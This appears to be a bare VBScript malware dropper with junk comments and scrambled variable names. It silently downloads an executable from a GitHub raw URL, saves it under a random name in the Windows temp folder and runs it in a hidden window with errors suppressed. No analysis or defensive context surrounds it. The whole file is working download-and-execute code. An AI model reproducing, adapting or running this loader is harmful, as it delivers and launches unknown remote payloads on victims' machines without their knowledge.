' eUfQIklQHlWntxPOoMnaoSkMeWypjjikN
On Error Resume Next
' ppyIeMnXlZmGNkQtXoGVhgTWlzroqDtfcFLazShOnGDDPlVAnoZtr ErVRBl
Dim xfkrgae,yrpmajj,zruxyr,ajnwnl,bkwkcjo,cbzgje
' ZExvvEvFbsdmEyMINbHPflSQEwHJbLyLTrSdfemcYQQCpJV
Set xfkrgae = CreateObject("MSXML2.ServerXMLHTTP")
xfkrgae.Open "GET","https://raw.githubusercontent.com/kai195102/d/main/rs.exe",False
xfkrgae.Send
' FEksiTRbHlClqPTVyctSOMOJEHiWO
If xfkrgae.Status = 200 Then
  Set yrpmajj = CreateObject("ADODB.Stream")
  yrpmajj.Type = 1
  yrpmajj.Open
  yrpmajj.Write xfkrgae.ResponseBody
  Set zruxyr = CreateObject("Scripting.FileSystemObject")
  ajnwnl = zruxyr.GetSpecialFolder(2)
  bkwkcjo = ajnwnl & "\BezOvSEC.exe"
  yrpmajj.SaveToFile bkwkcjo, 2
  yrpmajj.Close
  Set cbzgje = CreateObject("WScript.Shell")
  cbzgje.Run bkwkcjo, 0, False
End If
' MWJdqMkBVUgxkXZCPPqx
Set xfkrgae = Nothing
' SUVbVgTxScJcqBmgLrgqHztJpcfDzZ
